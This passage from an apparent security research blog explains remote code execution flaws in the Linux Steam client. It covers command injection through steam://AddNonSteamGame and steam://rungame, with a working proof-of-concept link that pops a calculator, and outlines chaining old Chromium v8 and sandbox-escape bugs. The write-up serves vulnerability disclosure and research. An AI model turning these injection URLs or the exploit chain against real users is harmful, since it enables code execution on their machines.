</span></span></code></pre></div><h3 id=from-arbitrary-file-creation-to-rce>From Arbitrary File Creation to RCE<a hidden class=anchor aria-hidden=true href=#from-arbitrary-file-creation-to-rce>#</a></h3><p>Among the many functionalities offered by <code>steam://</code> URLs, <code>steam://AddNonSteamGame</code> appears quite interesting. As the name suggests, it allows the addition of a user-provided string as a non-Steam game to the Steam game library. The Steam client executes non-Steam games as shell scripts, so we can insert backticks into the string to create a game that executes arbitrary commands. To use this feature, the <code>/tmp/addnonsteamgamefile</code> file needs to be created first. The Steam client checks for the existence of this file and attempts to read the gameid from it. If it reads an invalid gameid, it will generate one randomly, that is to say that the content of the file does not affect the functionality"</p><p>Coincidentally, our previous ability to create arbitrary files perfectly meets this requirement, allowing us to add any custom game.</p><p>While attempting to trigger this, we found that <code>steam://openexternalforpid</code> converts the domain names in the URLs it opens to lowercase. For instance, <code>steam://openexternalforpid/1/steam://AddNonSteamGame/</code> would be changed to <code>steam://addnonsteamgame/</code>, preventing Steam from correctly recognizing it.</p><img src=assets/5.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>After various attempts, we discovered a workaround, i.e., using an additional layer of <code>steam://open</code>:</p><img src=assets/6.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>At this point, we finally can create arbitrary malicious games. However, to run the game, we need to know the gameid of the game, and we do not know this randomly generated 64-bit number. This is not a big problem for us, who already have the ability to read any file. By reading <code>~/.local/share/Steam/logs/console_log.txt</code>, we can find the App id of the newly created malicious game.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span><span class=w> </span><span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span><span class=w> </span><span class=nx>ExecuteSteamURL</span><span class=p>:</span><span class=w> </span><span class=s>&#34;steam://open/steam://AddNonSteamGame/%60gnome-calculator%60&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span><span class=w> </span><span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span><span class=w> </span><span class=nx>ExecuteSteamURL</span><span class=p>:</span><span class=w> </span><span class=s>&#34;steam://AddNonSteamGame/%60gnome-calculator%60&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span><span class=w> </span><span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span><span class=w> </span><span class=nx>GLibLog</span><span class=p>:</span><span class=w> </span><span class=nx>domain</span><span class=p>:</span><span class=nx>Gtk</span><span class=w>  </span><span class=nx>msg</span><span class=p>:</span><span class=nf>gtk_disable_setlocale</span><span class=p>()</span><span class=w> </span><span class=nx>must</span><span class=w> </span><span class=nx>be</span><span class=w> </span><span class=nx>called</span><span class=w> </span><span class=nx>before</span><span class=w> </span><span class=nf>gtk_init</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>[</span><span class=mi>2023</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>21</span><span class=w> </span><span class=mo>04</span><span class=p>:</span><span class=mi>11</span><span class=p>:</span><span class=mi>53</span><span class=p>]</span><span class=w> </span><span class=nx>sanitize</span><span class=w> </span><span class=nx>shortcut</span><span class=w> </span><span class=nx>app</span><span class=w> </span><span class=nx>id</span><span class=w> </span><span class=s>&#34;`gnome-calculator`&#34;</span><span class=p>:</span><span class=w> </span><span class=nx>replacing</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=nx>with</span><span class=w> </span><span class=mi>3843969204</span><span class=p>,</span><span class=w> </span><span class=nx>reason</span><span class=p>:</span><span class=w> </span><span class=nx>k_unAppIdInvalid</span><span class=w>
</span></span></span></code></pre></div><p>The final gameid can be calculated from the App id found in the log. The gameid equals <code>app_id &lt;&lt; 32 | 0x2000000</code>. Once we know the gameid, we can use <code>steam://rungameid</code> to launch it.</p><img src=assets/7.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>The complete exploitation code has been publicly released on our <a href=https://github.com/DarkNavySecurity/PoC/tree/main/steam-2260570>GitHub</a>.</p><h2 id=rce2-command-injection-in-steamrungame>RCE#2: Command Injection in <code>steam://rungame</code><a hidden class=anchor aria-hidden=true href=#rce2-command-injection-in-steamrungame>#</a></h2><p><code>steam://rungame</code> is a URL scheme function provided by Steam that can be used to start games and specify their command-line arguments. When opened in the Linux client, it executes the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/sh -c /home/bob/.local/share/Steam/ubuntu12_32/reaper SteamLaunch <span class=nv>AppId</span><span class=o>={</span>appid<span class=o>}</span> -- /home/bob/.local/share/Steam/ubuntu12_32/steam-launch-wrapper -- <span class=o>{</span>gamepath<span class=o>}</span> <span class=o>{</span>argument<span class=o>}</span>
</span></span></code></pre></div><p>Since it is executed by <code>/bin/sh -c</code>, there is a possibility of command injection. We attempted to add <code>`ls`</code> in the command-line arguments, and found it becomes <code>'`ls`'</code>. Due to the backticks being wrapped in single quotes, direct command injection is not possible.</p><p>We then tried to add single quotes to the command-line arguments to break the pairing of single quotes, but found that the single quotes simply disappeared.</p><p>So we analyzed <code>steam://rungame</code> logic and performed a simple reverse engineering analysis, finding that its steps are roughly as follows:</p><ol><li>Call <code>V_ParseShellCommandLine</code>, where the single <code>'</code> are filtered, and <code>\'</code> is replaced with <code>'</code></li><li>Call <code>V_EscapeShellArgumentAndAppend</code> to wrap the argument with single quotes, and replace <code>'</code> in the argument with <code>'\''</code></li><li>Replace <code>\</code> with <code>\\</code></li><li>Concatenate it into the command string for execution</li></ol><p>It is apparent that in the third step, all <code>\</code> are treated as normal characters. To be processed correctly by <code>/bin/sh</code>, an extra <code>\</code> is added as escape character, but the possibility of <code>\</code> itself being an escape character was not considered. If we set our input as <code>\'`gnome-calculator`\'</code>, after the above four steps, it will become: <code>''\\''`gnome-calculator`'\\'''</code>. It is evident that replacing <code>\</code> with <code>\\</code> disrupts the correct pairing of single quotes, causing <code>`gnome-calculator`</code> to appear outside the single quotes, leading to a command injection issue.</p><p>Finally, to generate a URL that can be correctly processed by <code>steam://rungame</code>, the <code>\</code> needs to be URL-encoded. The final PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;steam://rungame/262410/76561202255233023/%5c&#39;`gnome-calculator`%5c&#39;&#34;</span><span class=p>&gt;</span>POPUP gnome-calculator<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>In this PoC, 262410 is the App id for &ldquo;World of Guns: Gun Disassembly&rdquo;, and it can be replaced with any installed game that parses command-line arguments (most games support this).</p><h2 id=rce3-historical-vulnerabilities-in-chrome>RCE#3: Historical Vulnerabilities in Chrome<a hidden class=anchor aria-hidden=true href=#rce3-historical-vulnerabilities-in-chrome>#</a></h2><p>The built-in browser in Steam is developed based on the <code>Chromium Embedded Framework</code> (CEF) version <code>85.0.4183.121</code>. CEF is a framework used to embed Chromium in applications, synchronized with Chromium&rsquo;s version number. The Chromium version <code>85.0.4183.121</code> was released in September 2020, and since then, numerous historical vulnerabilities have been found, but almost all of them haven&rsquo;t been patched by Steam.</p><p>We selected a v8 vulnerability (<a href=https://crbug.com/1234764>Issue 1234764</a>) and a sandbox escape vulnerability (<a href=https://crbug.com/1251727>Issue 1251727</a>) to achieve RCE.</p><p>The former is a optimization error of Right Operand Rotating, allowing arbitrary address read and write in the renderer process. The details of exploiting this are thoroughly explained in the attachment of the vulnerability report and will not be reiterated here.</p><p>The latter is a logical vulnerability. For the <code>kPortal</code> and <code>kFencedframe</code> types of frames created via <code>CreateChildFrame</code> called by Mojo, their state never changes to <code>kCreated</code>. This results in their destructors not calling <code>WebContentsObserver::RenderFrameDeleted</code> to notify objects holding the raw pointer of <code>RenderFrameHostImpl</code>, leading to UAF. This vulnerability is of excellent quality, as both free and use actions can be triggered at any time, and subsequent exploitation can utilize any Mojo interface under <code>RenderFrameHostImpl</code>. However, since the original PoC in the vulnerability report triggers the bug via a source code patch, achieving this effect requires patching the binary to add shellcode for sending Mojo messages.</p><p>In the actual process of writing the exploit, to reduce workload, we aimed to patch the binary as little as possible, preferring to write the exploit in JavaScript. However, we found that frames of type <code>kPortal</code> could not load HTML document by specifying src, thus, it was not possible to execute JavaScript in these frames. One option was to patch and use the <code>RenderFrameImpl::ExecuteJavaScript</code> function to execute JavaScript. Then, as suggested by Tim Becker in <a href=https://blog.theori.io/cleanly-escaping-the-chrome-sandbox-1c38abd3c9cb>Cleanly Escaping the Chrome Sandbox</a>, we could use a general approach of sending the Mojo handle from the portal frame to the main frame for exploitation.</p><p>However, this method still required patching. Here, we propose a new exploitation technique that allows a portal frame, which cannot execute JavaScript, to send Mojo messages without needing a patch, provided there is arbitrary read and write capability in the renderer.</p><p>Our research showed that when sending Mojo messages, the actual routing and handling are managed by the <code>mojo::Remote</code> field <code>internal_state_.proxy_</code>. We could exploit a v8 vulnerability to read the address of the portal&rsquo;s <code>RenderFrameImpl</code> from <code>g_frame_map</code> and manipulate it to &lsquo;steal&rsquo; the <code>proxy_</code> member and give it to another iframe under our control. This allows us to use the controlled iframe to masquerade as the portal and send Mojo messages using JavaScript.</p><img src=assets/8.png style=display:block;margin-left:auto;margin-right:auto;zoom:50%><p>The overall exploitation strategy is as follows:</p><ol><li><p>Use the v8 vulnerability to enable Mojo JS</p></li><li><p>Create an iframe A and hijack its vtable using the v8 vulnerability, modifying its <code>OwnerType</code> to pretend to be a portal frame</p></li><li><p>Create another iframe B for executing JavaScript later</p></li><li><p>Use the v8 vulnerability to read the addresses of <code>RenderFrameImpl</code> for A and B from <code>g_frame_map</code></p></li><li><p>Use the v8 vulnerability to assign A&rsquo;s <code>proxy_</code> to B</p></li><li><p>Use B to create a Mojo connection</p></li><li><p>Remove A, triggering the destruction of <code>RenderFrameHostImpl</code></p></li><li><p>Use B to trigger UAF</p></li><li><p>Use Blob for placeholder, control the vtable, and other subsequent exploitations.</p></li></ol></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://www.darknavy.org/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/><span class=title>« Prev</span><br><span>CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes</span>
</a><a class=next href=https://www.darknavy.org/blog/avss_report_kernel/><span class=title>Next »</span><br><span>AVSS Report: System Security Adversarial Capability Preliminary Evaluation of iOS, Android, and HarmonyOS - Kernel</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://www.darknavy.org/>DARKNAVY</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>